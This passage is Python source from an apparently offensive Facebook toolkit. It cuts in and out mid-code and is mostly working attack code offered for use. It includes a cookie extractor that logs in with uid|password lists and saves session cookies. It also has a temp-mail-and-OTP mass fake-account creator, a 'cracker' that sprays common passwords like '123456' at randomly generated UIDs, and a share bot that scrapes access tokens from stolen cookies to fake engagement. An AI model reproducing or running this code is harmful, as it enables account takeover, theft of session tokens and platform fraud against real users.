    banner(); sec_hdr("C O O K I E S   E X T R A C T O R", C); linex()
    print(f"{W}  {_X}│  {Y}Total IDs  {_X}│  {R}{_total_c}")
    print(f"{W}  {_X}│  {Y}File       {_X}│  {C}{os.path.basename(fp)}")
    linex()
    ses = requests.Session()
    ses.headers.update({'User-Agent':'FBAN/Orca-Android;FBAV/327.0.1.48;FBPN/com.facebook.orca;FBLC/en_US;'})
    for line in lines:
        _loop_c += 1
        try:
            if '|' not in line: continue
            uid, pw = line.split('|',1)
            url = (f"https://b-api.facebook.com/method/auth.login?access_token=237759909591655"
                   f"%257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1"
                   f"&email={uid}&locale=en_US&password={pw}&sdk=ios"
                   f"&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm")
            d = ses.get(url, timeout=CFG['timeout']).json()
            if 'session_cookies' in d:
                coki = ';'.join(f"{i['name']}={i['value']}" for i in d['session_cookies'])
                linex()
                print(f"{G}  ✓  EXTRACTED")
                print(f"{W}  {_X}│  {Y}UID      {_X}│  {G}{uid}")
                print(f"{W}  {_X}│  {Y}Password {_X}│  {O}{pw}")
                for idx, ch_ in enumerate([coki[j:j+58] for j in range(0,min(len(coki),290),58)]):
                    lbl = 'Cookies' if idx==0 else '       '
                    print(f"{W}  {_X}│  {Y}{lbl}  {_X}│  {_A}{ch_}")
                print(f"{W}  {_X}│  {Y}Date     {_X}│  {D}{now_str()}")
                save(f"{uid}|{pw}|{coki}", CFG['f_coki_ok'])
                _ok_count += 1
            elif 'www.facebook.com' in d.get('error_msg',''):
                save(f"{uid}|{pw}", CFG['f_coki_cp']); _cp_count += 1
            else:
                sys.stdout.write(f"\r{_H}  PREM {W}{_loop_c}/{_total_c} {G}OK•{_ok_count} {R}CP•{_cp_count} {RESET}")
                sys.stdout.flush()
            sleep(0.5)
        except Exception: sleep(3); continue
    print(); linex()
    print(f"{W}  {G}▸{W}  DONE  │  {G}OK:{_ok_count}  {_X}│  {R}CP:{_cp_count}{RESET}")
    linex(); press_enter(main_menu)

# ==================================================================
# SECTION 11 – TEMPMAIL BACKENDS
#  · Primary  : Mail.tm  (https://api.mail.tm)
#  · Fallback : 1secmail  (https://www.1secmail.com)
#  · Fallback2: Guerrilla (https://api.guerrillamail.com)
# ==================================================================

# --- Mail.tm ---------------------------------------------------------
def mailtm_create() -> Optional[dict]:
    """Create a Mail.tm account. Returns {email, password, token} or None."""
    try:
        doms = requests.get('https://api.mail.tm/domains?page=1', timeout=10).json()
        dom  = doms.get('hydra:member', [{}])[0].get('domain','')
        if not dom: return None
        un   = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        em   = f"{un}@{dom}"
        pw   = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        r1   = requests.post('https://api.mail.tm/accounts',
                             json={'address': em, 'password': pw}, timeout=10)
        if r1.status_code not in (200, 201): return None
        r2   = requests.post('https://api.mail.tm/token',
                             json={'address': em, 'password': pw}, timeout=10)
        tok  = r2.json().get('token','')
        if not tok: return None
        return {'email': em, 'password': pw, 'token': tok, 'backend': 'mail.tm'}
    except Exception as e:
        logging.error(f"mailtm_create: {e}")
        return None

def mailtm_inbox(token: str) -> list:
    try:
        r = requests.get('https://api.mail.tm/messages',
                         headers={'Authorization': f'Bearer {token}'}, timeout=10)
        return r.json().get('hydra:member', [])
    except: return []

def mailtm_read(token: str, msg_id: str) -> str:
    try:
        r = requests.get(f'https://api.mail.tm/messages/{msg_id}',
                         headers={'Authorization': f'Bearer {token}'}, timeout=10)
        d = r.json()
        return d.get('text', d.get('html', str(d)))
    except: return ''

# --- 1secmail ---------------------------------------------------------
def onesec_create() -> Optional[dict]:
    try:
        r   = requests.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1', timeout=10)
        em  = r.json()[0]
        lg, dom = em.split('@')
        return {'email': em, 'login': lg, 'domain': dom, 'backend': '1secmail'}
    except: return None

def onesec_inbox(login: str, domain: str) -> list:
    try:
        r = requests.get(f'https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}', timeout=10)
        return r.json() if isinstance(r.json(), list) else []
    except: return []

def onesec_read(login: str, domain: str, msg_id) -> str:
    try:
        r = requests.get(f'https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={msg_id}', timeout=10)
        d = r.json()
        return d.get('body', d.get('htmlBody', str(d)))
    except: return ''

# --- Guerrilla Mail fallback -----------------------------------------
def guerrilla_create() -> Optional[dict]:
    try:
        r  = requests.get('https://api.guerrillamail.com/ajax.php?f=get_email_address', timeout=10)
        d  = r.json()
        em = d.get('email_addr','')
        st = d.get('sid_token','')
        if not em: return None
        return {'email': em, 'sid_token': st, 'backend': 'guerrilla'}
    except: return None

def guerrilla_inbox(sid_token: str) -> list:
    try:
        r = requests.get(f'https://api.guerrillamail.com/ajax.php?f=check_email&seq=0&sid_token={sid_token}', timeout=10)
        return r.json().get('list', [])
    except: return []

def guerrilla_read(sid_token: str, msg_id) -> str:
    try:
        r = requests.get(f'https://api.guerrillamail.com/ajax.php?f=fetch_email&email_id={msg_id}&sid_token={sid_token}', timeout=10)
        d = r.json()
        return d.get('mail_body', str(d))
    except: return ''

# --- Universal inbox poller ------------------------------------------
def poll_inbox(acct: dict, timeout_sec: int = 120) -> Optional[str]:
    """
    Poll the inbox of a temp-email account until a message with an OTP arrives.
    Returns the OTP string or None if timed out.
    """
    backend  = acct.get('backend','')
    seen_ids = set()
    deadline = time.time() + timeout_sec
    while time.time() < deadline:
        msgs = []
        if backend == 'mail.tm':
            msgs = mailtm_inbox(acct['token'])
        elif backend == '1secmail':
            msgs = onesec_inbox(acct['login'], acct['domain'])
        elif backend == 'guerrilla':
            msgs = guerrilla_inbox(acct['sid_token'])

        for msg in msgs:
            mid = str(msg.get('id', msg.get('mail_id', '')))
            if mid in seen_ids: continue
            seen_ids.add(mid)
            if backend == 'mail.tm':
                body = mailtm_read(acct['token'], mid)
            elif backend == '1secmail':
                body = onesec_read(acct['login'], acct['domain'], mid)
            elif backend == 'guerrilla':
                body = guerrilla_read(acct['sid_token'], mid)
            else:
                body = str(msg)
            otps = re.findall(r'\b\d{4,8}\b', body)
            if otps: return otps[0]
        sleep(4)
    return None

def get_temp_email() -> Optional[dict]:
    """Try Mail.tm first, then 1secmail, then Guerrilla."""
    acct = mailtm_create()
    if acct: return acct
    acct = onesec_create()
    if acct: return acct
    return guerrilla_create()

# ==================================================================
# SECTION 12 – TEMPMAIL OTP RECEIVER  (Option E)
# ==================================================================
def tempmail_otp():
    try:
        banner()
        print(f"{_H}  ╔══════════════════════════════════════════════════════╗")
        print(f"{_H}  ║{C}{BOLD}      ◈  T E M P M A I L   O T P   R X  ◈         {RESET}{_H} ║")
        print(f"{_H}  ╚══════════════════════════════════════════════════════╝{RESET}")
        linex()
        print(f"{C}  [~]  Generating temp email ...{RESET}", end='', flush=True)
        acct = get_temp_email()
        if not acct:
            print(f"\r{R}  ✗  Could not create temp email. Check internet.{RESET}")
            press_enter(main_menu); return
        em = acct['email']
        print(f"\r{G}  [+]  Email ready!  ({acct['backend']}){' '*20}")
        linex()
        print(f"{W}  {_X}│  {Y}Temp Email  {_X}│  {G}{em}")
        print(f"{W}  {_X}│  {Y}Backend     {_X}│  {C}{acct['backend']}")
        print(f"{W}  {_X}│  {Y}Date        {_X}│  {D}{now_str()}")
        print(f"{C}  [~]  Waiting for messages  ·  Press Ctrl+C to stop{RESET}")
        linex()
        seen = set(); attempt = 0
        while True:
            attempt += 1
            backend = acct.get('backend','')
            msgs = []
            if backend == 'mail.tm':    msgs = mailtm_inbox(acct['token'])
            elif backend == '1secmail': msgs = onesec_inbox(acct['login'], acct['domain'])
            elif backend == 'guerrilla':msgs = guerrilla_inbox(acct['sid_token'])
            for msg in msgs:
                mid = str(msg.get('id', msg.get('mail_id','')))
                if mid in seen: continue
                seen.add(mid)
                if backend == 'mail.tm':    body = mailtm_read(acct['token'], mid)
                elif backend == '1secmail': body = onesec_read(acct['login'], acct['domain'], mid)
                else:                       body = guerrilla_read(acct['sid_token'], mid)
                subj = msg.get('subject', msg.get('mail_subject',''))
                frm  = msg.get('from', {})
                frm  = frm.get('address', str(frm)) if isinstance(frm, dict) else str(frm)
                otps = re.findall(r'\b\d{4,8}\b', body)
                print(f"\n{_H}  ╔══════════════════════════════════════════════════════╗")
                print(f"{_H}  ║{_A}  ✉  NEW MESSAGE RECEIVED                             {_H}║")
                print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
                print(f"{W}  {_X}│  {Y}From    {_X}│  {W}{frm[:50]}")
                print(f"{W}  {_X}│  {Y}Subject {_X}│  {W}{subj[:50]}")
                if otps:
                    print(f"{W}  {_X}│  {G}{BOLD}OTP     {_X}│  {G}{BOLD}{otps[0]}{RESET}")
                print(f"{W}  {_X}│  {Y}Body    {_X}│  {D}{body[:80]}")
                print(f"{_H}  ╚══════════════════════════════════════════════════════╝{RESET}")
                linex()
            sys.stdout.write(f"\r{C}  [~]  Inbox check #{attempt}  ({em}){RESET}   ")
            sys.stdout.flush()
            sleep(5)
    except KeyboardInterrupt:
        print(f"\n{R}  ✗  Stopped{RESET}"); press_enter(main_menu)
    except Exception as e:
        print(f"\n{R}  ✗  Error: {e}{RESET}"); press_enter(main_menu)

# ==================================================================
# SECTION 13 – CREATE FB via TEMPMAIL + OTP  (Option F)
# ==================================================================
def createfb_with_tempmail():
    global _oks, _cps
    banner()
    print(f"{_H}  ╔══════════════════════════════════════════════════════╗")
    print(f"{_H}  ║{G}{BOLD}  ◈  C R E A T E   F B  ·  T E M P M A I L + O T P {RESET}{_H}║")
    print(f"{_H}  ╚══════════════════════════════════════════════════════╝{RESET}")
    linex()
    try:
        num = int(prompt("HOW MANY ACCOUNTS").strip())
    except ValueError:
        print(f"{R}  ✗  Invalid number{RESET}"); press_enter(main_menu); return
    print(f"  {_A}[1]{W}  Auto Password   {_A}[2]{W}  Custom Password"); linex()
    pch = prompt("PASSWORD (1/2)").strip()
    pw  = rand_pass() if pch == '1' else prompt("ENTER PASSWORD").strip()
    show = prompt("Show full details? (y/n)").strip().lower() == 'y'
    banner(); sec_hdr("C R E A T I N G   v i a   T E M P M A I L", G)
    linex()
    print(f"{W}  {_X}│  {Y}Total  {_X}│  {R}{num}")
    print(f"{W}  {_X}│  {Y}Pass   {_X}│  {O}{pw}")
    linex()

    for i in range(num):
        sys.stdout.write(f"\r{C}  [~]  Account {i+1}/{num}  getting email...{RESET}   ")
        sys.stdout.flush()
        try:
            acct = get_temp_email()
            if not acct:
                print(f"\r{R}  ✗  Temp email unavailable. Skipping.{RESET}"); continue
            em = acct['email']
            ses  = requests.Session(); ses.headers.update(reg_headers())
            resp = ses.get(CFG['fb_reg'], timeout=CFG['timeout'])
            frm  = extractor(resp.text)
            fn, ln = rand_name()
            pl = build_payload(fn, ln, em, pw, frm, sex='2')
            hdrs = {**reg_headers(), 'Referer':'https://www.facebook.com/reg/'}
            ses.post(CFG['fb_submit'], data=pl, headers=hdrs, timeout=CFG['timeout'])
            cki = ses.cookies.get_dict()

            # If already logged in (rare but possible)
            if 'c_user' in cki:
                uid = cki['c_user']
                cstr = ';'.join(f"{k}={v}" for k,v in cki.items())
                _oks.append(uid)
                save(f"{uid}|{em}|{pw}|{cstr}", CFG['f_tmpmail'])
                if show: _print_ok(fn, ln, em, uid, pw, cstr)
                else: print(f"\r{G}  [OK] {uid} | {em} | {pw}{RESET}   ")
                continue

            # Wait for OTP
            sys.stdout.write(f"\r{Y}  [~]  Registered {em}  waiting for OTP...{RESET}   ")
            sys.stdout.flush()
            otp = poll_inbox(acct, timeout_sec=120)

            if not otp:
                print(f"\r{R}  [-]  No OTP received for {em}{RESET}")
                _cps.append(em); continue

            # Confirm OTP
            confirm_pl = {
                'code': otp, 'fb_dtsg': frm.get('fb_dtsg',''),
                'lsd':  frm.get('lsd',''), 'submit': 'Confirm',
            }
            ses.post(CFG['fb_confirm'], data=confirm_pl, headers=hdrs, timeout=CFG['timeout'])
            cki2 = ses.cookies.get_dict()
            if 'c_user' in cki2:
                uid  = cki2['c_user']
                cstr = ';'.join(f"{k}={v}" for k,v in cki2.items())
                _oks.append(uid)
                save(f"{uid}|{em}|{pw}|{otp}|{cstr}", CFG['f_tmpmail'])
                if show:
                    _print_ok(fn, ln, em, uid, pw, cstr)
                    print(f"{W}  {_X}│  {Y}OTP     {_X}│  {G}{otp}")
                else:
                    print(f"\r{G}  [OK] {uid} | {em} | OTP:{otp}{RESET}   ")
            else:
                print(f"\r{Y}  [!]  OTP confirmed ({otp}) but checkpoint hit{RESET}")
                _cps.append(em)
        except Exception as e:
            print(f"\r{R}  [-]  Error: {e}{RESET}"); sleep(3); continue

    print(); linex()
    print(f"{W}  {G}▸{W}  DONE  │  {G}OK:{len(_oks)}  {_X}│  {R}CP:{len(_cps)}{RESET}")
    linex(); press_enter(main_menu)

# ==================================================================
# SECTION 14 – FB CRACKER  (Old Clone – full output)
# ==================================================================
_crack_oks: List[str] = []
_crack_loop = 0

def acc_year(uid: str) -> str:
    if len(uid) == 15:
        for p in ('1000000000','100000000','10000000'): 
            if uid.startswith(p): return '2009'
        for p in ('1000001','1000002','1000003','1000004','1000005'):
            if uid.startswith(p): return '2009'
        for p in ('1000006','1000007','1000008','1000009'):
            if uid.startswith(p): return '2010'
        if uid.startswith('100001'): return '2010'
        if uid.startswith('100002'): return '2011'
        if uid.startswith('100003'): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith('100005'): return '2013'
        if uid.startswith('100006'): return '2013'
        if uid.startswith('100007'): return '2014'
        if uid.startswith('100008'): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'):  return '2016'
        if uid.startswith('10002'):  return '2017'
        if uid.startswith('10003'):  return '2018'
        if uid.startswith('10004'):  return '2019'
        if uid.startswith('10005'):  return '2020'
        if uid.startswith('10006'):  return '2021'
        if uid.startswith('10007'):  return '2022'
        if uid.startswith('10008'):  return '2022'
        if uid.startswith('10009'):  return '2023'
        return ''
    if len(uid) in (9,10): return '2008'
    if len(uid) == 8:      return '2007'
    if len(uid) == 7:      return '2006'
    if len(uid) == 14 and uid.startswith('61'): return '2024'
    return ''

def _crack_hit(uid, pw, year, res, tag):
    """Print full cracked account info – all fields, full cookies."""
    ip = get_ip()
    linex_bold()
    print(f"{G}{BOLD}  ✓  CRACKED  [{tag}]{RESET}")
    print(f"{_H}  ╔══════════════════════════════════════════════════════╗")
    print(f"{_H}  ║{G}{BOLD}           CRACKED ACCOUNT DETAILS                     {RESET}{_H}║")
    print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
    print(f"{W}  {_X}│  {Y}UID              {_X}│  {G}{uid}")
    print(f"{W}  {_X}│  {Y}Password         {_X}│  {O}{pw}")
    print(f"{W}  {_X}│  {Y}Account Year     {_X}│  {C}{year or 'Unknown'}")
    sk = res.get('session_key','')
    at = res.get('access_token','')
    sc = res.get('session_cookies',[])
    if sk:
        for i, ch in enumerate([sk[j:j+55] for j in range(0,len(sk),55)]):
            print(f"{W}  {_X}│  {Y}{'Session Key' if i==0 else '           '}    {_X}│  {_A}{ch}")
    if at:
        for i, ch in enumerate([at[j:j+55] for j in range(0,len(at),55)]):
            print(f"{W}  {_X}│  {Y}{'Token' if i==0 else '     '}          {_X}│  {_A}{ch}")
    if sc:
        cstr = ';'.join(f"{c.get('name','')}={c.get('value','')}" for c in sc) if isinstance(sc,list) else str(sc)
        for i, ch in enumerate([cstr[j:j+55] for j in range(0,min(len(cstr),550),55)]):
            print(f"{W}  {_X}│  {Y}{'Cookies' if i==0 else '       '}         {_X}│  {_A}{ch}")
    skip = {'session_key','session_cookies','access_token','uid','error','error_code','error_data'}
    for k, v in res.items():
        if k.lower() in skip: continue
        print(f"{W}  {_X}│  {Y}{k[:16]:<16} {_X}│  {D}{str(v)[:55]}")
    print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
    print(f"{W}  {_X}│  {V}Your IP          {_X}│  {V}{ip}")
    print(f"{W}  {_X}│  {V}Date / Time      {_X}│  {D}{now_str()}")
    print(f"{_H}  ╚══════════════════════════════════════════════════════╝{RESET}")
    linex_bold()

def crack_m1(uid: str):
    global _crack_loop, _crack_oks
    try:
        sys.stdout.write(f"\r{_H}  PREM-CRACK  {G}OK:{len(_crack_oks)}  {_X}loop:{_crack_loop}{RESET}  ")
        sys.stdout.flush()
        ses = requests.session()
        for pw in ('123456','1234567','12345678','123456789'):
            data = {
                'adid': str(uuid.uuid4()), 'format':'json',
                'device_id': str(uuid.uuid4()), 'cpl':'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type':'device_based_login_password',
                'error_detail_type':'button_with_disabled',
                'source':'device_based_login',
                'email': uid, 'password': pw,
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies':'1', 'meta_inf_fbmeta':'',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid':'0',
                'locale':'en_US', 'client_country_code':'US',
                'method':'auth.login',
                'fb_api_req_friendly_name':'authenticate',
                'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key':'882a8490361da98702bf97a021ddc14d',
            }
            hdrs = {
                'User-Agent': ua_win(),
                'Content-Type':'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI':'25227', 'X-FB-SIM-HNI':'29752',
                'X-FB-Connection-Type':'MOBILE.LTE',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group':'5120',
                'X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True', 'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62',
            }
            res = ses.post('https://b-graph.facebook.com/auth/login',
                           data=data, headers=hdrs, allow_redirects=False).json()
            yr  = acc_year(uid)
            if 'session_key' in res:
                _crack_hit(uid, pw, yr, res, 'M1')
                save(f"{uid}|{pw}|{res.get('session_key','')}|{res.get('access_token','')}", CFG['f_crack_m1'])
                _crack_oks.append(uid); break
            elif 'www.facebook.com' in res.get('error',{}).get('message',''):
                _crack_hit(uid, pw, yr, res, 'M1-FB')
                save(f"{uid}|{pw}", CFG['f_crack_m1'])
                _crack_oks.append(uid); break
        _crack_loop += 1
    except: sleep(5)

def crack_m2(uid: str):
    global _crack_loop, _crack_oks
    sys.stdout.write(f"\r{_H}  PREM-CRACK  {G}OK:{len(_crack_oks)}  {_X}loop:{_crack_loop}{RESET}  ")
    sys.stdout.flush()
    for pw in ('123456','123123','1234567','12345678','123456789'):
        try:
            with requests.Session() as ses:
                hdrs = {
                    'x-fb-connection-bandwidth': str(rr(20000000,29999999)),
                    'x-fb-sim-hni': str(rr(20000,40000)),
                    'x-fb-net-hni': str(rr(20000,40000)),
                    'x-fb-connection-quality':'EXCELLENT',
                    'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': ua_win(),
                    'content-type':'application/x-www-form-urlencoded',
                    'x-fb-http-engine':'Liger',
                }
                url = (f"https://b-api.facebook.com/method/auth.login?format=json"
                       f"&email={uid}&password={pw}"
                       f"&credentials_type=device_based_login_password"
                       f"&generate_session_cookies=1"
                       f"&error_detail_type=button_with_disabled"
                       f"&source=device_based_login"
                       f"&meta_inf_fbmeta=%20&currently_logged_in_userid=0"
                       f"&method=GET&locale=en_US&client_country_code=US"
                       f"&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
                       f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                       f"&fb_api_req_friendly_name=authenticate&cpl=true")
                res = ses.get(url, headers=hdrs).json()
                yr  = acc_year(uid)
                if 'session_key' in str(res):
                    _crack_hit(uid, pw, yr, res, 'M2')
                    save(f"{uid}|{pw}|{res.get('session_key','')}|{res.get('access_token','')}", CFG['f_crack_m2'])
                    _crack_oks.append(uid); break
        except: pass
    _crack_loop += 1

def _crack_run(series: str):
    banner(); sec_hdr(f"C R A C K E R  ·  {series}", R); linex()
    if series == 'ALL SERIES':
        ask = prompt("RANGE  [1] 1B–2B  [2] 2B–5B").strip()
    print(f"{W}  Example: 20000 / 50000 / 99999")
    limit_str = prompt("TOTAL ID COUNT").strip()
    try: limit = int(limit_str)
    except: print(f"{R}  ✗  Invalid{RESET}"); return
    linex()
    print(f"  {_A}[A]{W}  Method A      {_A}[B]{W}  Method B"); linex()
    meth = prompt("METHOD (A/B)").strip().upper()
    uids = []
    if series == 'ALL SERIES':
        for _ in range(limit):
            uids.append('10000' + str(rr(1000000000, 1999999999 if ask=='1' else 4999999999)))
    elif series == '100003/4':
        for _ in range(limit):
            p = random.choice(['100003','100004'])
            uids.append(p + ''.join(random.choices('0123456789', k=9)))
    elif series == '2009':
        for _ in range(limit):
            uids.append('1000004' + ''.join(random.choices('0123456789', k=8)))
    banner(); sec_hdr("C R A C K I N G   I N   P R O G R E S S", R); linex()
    print(f"{W}  {_X}│  {Y}Total  {_X}│  {R}{limit}")
    print(f"{W}  {_X}│  {Y}Series {_X}│  {C}{series}")
    print(f"{W}  {_X}│  {Y}Method {_X}│  {O}{meth}")
    print(f"{W}  {_X}│  {Y}Date   {_X}│  {D}{now_str()}")
    print(f"{Y}  ▸  Tip: Use Airplane Mode cycle for better hit rate{RESET}")
    linex()
    fn = crack_m1 if meth == 'A' else crack_m2
    with ThreadPoolExecutor(max_workers=CFG['crack_workers']) as pool:
        for uid in uids: pool.submit(fn, uid)

def cracker_menu():
    while True:
        banner()
        print(f"{_H}  ╔══════════════════════════════════════════════════════╗")
        print(f"{_H}  ║{R}{BOLD}           ◈  F B   C R A C K E R  ◈             {RESET}{_H}    ║")
        print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
        print(f"{_H}  ║  {_A}[A]{W}  All Series         · 2010–2014               {_H}║")
        print(f"{_H}  ║  {_A}[B]{W}  100003/4 Series    · 2011–2012               {_H}║")
        print(f"{_H}  ║  {_A}[C]{W}  2009 Series        · 2009–2010               {_H}║")
        print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
        print(f"{_H}  ║  {R}[0]{W}  Back                                           {_H}║")
        print(f"{_H}  ╚══════════════════════════════════════════════════════╝{RESET}")
        linex()
        ch = prompt("SELECT").strip().upper()
        if   ch in ('A','1'): _crack_run('ALL SERIES')
        elif ch in ('B','2'): _crack_run('100003/4')
        elif ch in ('C','3'): _crack_run('2009')
        elif ch == '0': main_menu()
        else: bad()

# ==================================================================
# SECTION 15 – SHARE TOOL
# ==================================================================
_share_ses = requests.Session()

def share_login():
    banner(); sec_hdr("S H A R E   T O O L  ·  L O G I N", _A); linex()
    print(f"{Y}  ▸  Enter Facebook cookies to extract access tokens{RESET}"); linex()
    try: nc = int(prompt("How many cookies?").strip())
    except: print(f"{R}  ✗  Invalid{RESET}"); return share_login()
    tokens: List[str] = []; cooks: List[dict] = []
    for i in range(nc):
        raw = prompt(f"Cookie {i+1}").strip()
        ck  = {j.split('=')[0]: j.split('=')[1] for j in raw.split('; ') if '=' in j}
        try:
            d = _share_ses.get('https://business.facebook.com/business_locations',
                headers={'user-agent': random.choice(_share_uas),
                         'referer':'https://www.facebook.com/',
                         'host':'business.facebook.com',
                         'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                         'accept-language':'en-US,en;q=0.8'},
                cookies=ck, timeout=10)
            tok = re.search(r'(EAAG\w+)', d.text)
            if not tok:
                print(f"{R}  ✗  Token not found for cookie {i+1}{RESET}"); continue
            tokens.append(tok.group(1)); cooks.append(ck)
            linex()
            print(f"{G}  ✓  Token found  →  {_A}{tok.group(1)[:55]}...{RESET}")
            linex()
        except Exception as e:
            print(f"{R}  ✗  Cookie {i+1} error: {e}{RESET}")
    if not tokens: print(f"{R}  ✗  No valid cookies{RESET}"); return share_login()
    tp = os.path.join(CFG['base'], CFG['f_share_tok'])
    cp = os.path.join(CFG['base'], CFG['f_share_cok'])
    with open(tp,'w') as f: json.dump(tokens, f)
    with open(cp,'w') as f: json.dump(cooks, f)
    sleep(2); share_bot(tokens, cooks)

def _share_one(token, cookie, link, n, acct_shares, failed):
    if token in failed: return False
    for att in range(20):
        try:
            ua = random.choice(_share_uas)
            if any(k in link.lower() for k in ['video','reel','watch']):
                hdrs = {'authority':'graph.facebook.com','user-agent':ua,'accept':'application/json',
                        'content-type':'application/x-www-form-urlencoded','sec-fetch-mode':'cors'}
            else:
                hdrs = {'authority':'graph.facebook.com','user-agent':ua}
            r = _share_ses.post(
                f"https://graph.facebook.com/v18.0/me/feed?link={link}&published=0&access_token={token}",
                headers=hdrs, cookies=cookie, timeout=25).text
            d = json.loads(r)
            if 'id' in d:
                tuid = d['id'].split('_')[0] if '_' in d['id'] else d['id']
                print(f"{G}  ✓  Share #{n}  │  uid: {tuid}{RESET}")
                acct_shares[token] += 1; return True
            elif 'error' in d:
                em_ = d['error']['message'].lower()
                if any(k in em_ for k in ['rate limit','suspended','blocked','checkpoint','disabled','login required']):
                    failed.add(token); return False
                elif any(k in em_ for k in ['video','reel','content']):
                    sleep(3); continue
                else: return False
        except requests.exceptions.ConnectionError: pass
        except requests.exceptions.Timeout: pass
        except Exception: pass
        sleep(min(5*(2**att), 900))
    failed.add(token); return False

def share_bot(tokens=None, cooks=None):
    clr(); banner(); sec_hdr("S H A R E   T O O L  ·  B O T", _A)
    if tokens is None:
        try:
            tp = os.path.join(CFG['base'], CFG['f_share_tok'])
            cp = os.path.join(CFG['base'], CFG['f_share_cok'])
            with open(tp) as f: tokens = json.load(f)
            with open(cp) as f: cooks  = json.load(f)
        except:
            print(f"{R}  ✗  No saved tokens found{RESET}"); return share_login()
    linex(); print(f"{Y}  ▸  {len(tokens)} token(s) loaded{RESET}"); linex()
    acct_shares: Dict[str,int] = {t:0 for t in tokens}
    failed: Set[str] = set()
    while True:
        link = prompt("Post link").strip()
        try: lim = min(int(prompt("Share limit").strip()), 500000)
        except: print(f"{R}  ✗  Invalid{RESET}"); continue
        print(f"{Y}  ▸  Starting {lim} shares...{RESET}")
        t0 = datetime.now(); ok = 0; fail = 0
        with ThreadPoolExecutor(max_workers=CFG['share_workers']) as ex:
            futs = []
            for n in range(1, lim+1):
                av = [t for t in tokens if acct_shares[t]<CFG['share_cap'] and t not in failed]
                if not av:
                    print(f"{Y}  [!]  Cooldown {CFG['share_cd']}s...{RESET}"); sleep(CFG['share_cd'])
                    acct_shares = {t:0 for t in tokens if t not in failed}
                    av = [t for t in tokens if t not in failed]
                if not av: print(f"{R}  ✗  No working accounts{RESET}"); return share_login()
                tok_ = random.choice(av); ck_ = cooks[tokens.index(tok_)]
                futs.append(ex.submit(_share_one, tok_, ck_, link, n, acct_shares, failed))
                sleep(0.1)
                if n % CFG['share_cap'] == 0:
                    print(f"{Y}  [!]  Cooldown {CFG['share_cd']}s after {n} shares...{RESET}")
                    sleep(CFG['share_cd'])
            for f in as_completed(futs):
                try:
                    if f.result(): ok += 1
                    else: fail += 1
                except: fail += 1
        elapsed = str(datetime.now()-t0).split('.')[0]
        linex()
        print(f"{G}  ✓  Done!  │  {G}Success:{ok}  {R}Fail:{fail}  {C}Time:{elapsed}{RESET}")
        linex()
        ch = prompt("continue / exit ?").strip().lower()
        if ch == 'exit': return share_login()

def share_tool_menu():
    while True:
        banner()
        print(f"{_H}  ╔══════════════════════════════════════════════════════╗")
        print(f"{_H}  ║{_A}{BOLD}           ◈  S H A R E   T O O L  ◈             {RESET}{_H}    ║")
        print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
        print(f"{_H}  ║  {_A}[1]{W}  Start  (Enter Cookies)                        {_H}║")
        print(f"{_H}  ║  {_A}[2]{W}  Resume (Load Saved Tokens)                    {_H}║")
        print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
        print(f"{_H}  ║  {R}[0]{W}  Back                                           {_H}║")
        print(f"{_H}  ╚══════════════════════════════════════════════════════╝{RESET}")
        linex()
        ch = prompt("SELECT").strip()
        if   ch == '1': share_login()
        elif ch == '2': share_bot()
        elif ch == '0': main_menu()
        else: bad()

# ==================================================================
# SECTION 16 – UTILITIES
# ==================================================================

def uid_info():
    banner(); sec_hdr("U I D   I N F O   C H E C K E R", Y); linex()
    raw = prompt("UIDs (comma-separated)").strip()
    uids = [u.strip() for u in raw.split(',') if u.strip()]
    linex()
    for uid in uids:
        yr = acc_year(uid)
        try:
            r = requests.get(f"https://graph.facebook.com/{uid}?fields=id,name,picture&access_token=0",
                             timeout=10, headers={'User-Agent': uagen()}).json()
        except: r = {}
        linex_bold()
        print(f"{_H}  ┌─[ {Y}UID INFO {_H}]{'─'*44}┐")
        print(f"{W}  {_X}│  {Y}UID         {_X}│  {G}{uid}")
        print(f"{W}  {_X}│  {Y}Est. Year   {_X}│  {C}{yr or 'Unknown'}")
        if 'name' in r: print(f"{W}  {_X}│  {Y}Name        {_X}│  {W}{r['name']}")
        if 'id'   in r: print(f"{W}  {_X}│  {Y}FB ID       {_X}│  {G}{r['id']}")
        if 'error' in r: print(f"{W}  {_X}│  {Y}Status      {_X}│  {R}{r['error'].get('message','?')[:50]}")
        print(f"{W}  {_X}│  {Y}Profile     {_X}│  {_A}https://facebook.com/{uid}")
        print(f"{_H}  └{'─'*52}┘{RESET}")
        save(f"{uid}|{yr}|{r.get('name','?')}|{now_str()}", CFG['f_uid_checked'])
    linex(); press_enter(utilities_menu)

def pwlist_gen():
    banner(); sec_hdr("P A S S W O R D   L I S T   G E N E R A T O R", Y); linex()
